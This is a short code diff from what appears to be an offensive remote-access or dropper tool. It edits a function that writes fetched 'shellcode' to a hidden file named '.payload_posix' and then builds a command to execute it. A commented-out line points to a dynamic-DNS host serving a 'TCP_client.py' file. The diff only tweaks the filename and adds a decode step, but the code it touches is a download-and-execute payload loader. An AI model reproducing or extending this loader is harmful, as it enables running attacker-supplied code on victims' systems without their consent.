@@ -41,7 +41,7 @@ def run(**args):
       bin = False
       ScriptExec = "python3.5 "
       #url = "http://saw-dsr.ddns.net:8000/TCP_client.py"
-      OsTargetpath = ".payload_posix.py"
+      OsTargetpath = ".payload_posix"
   else:
       return "[ERROR] getFileFromURI: Not recognised OS!"
 
@@ -67,7 +67,7 @@ def run(**args):
   else:
     print(shellcode)
     mon_fichier = open(OsTargetpath, "w")
-    mon_fichier.write(shellcode)
+    mon_fichier.write(shellcode.decode())
     mon_fichier.close()
     cmd= ScriptExec+" "+OsTargetpath
 
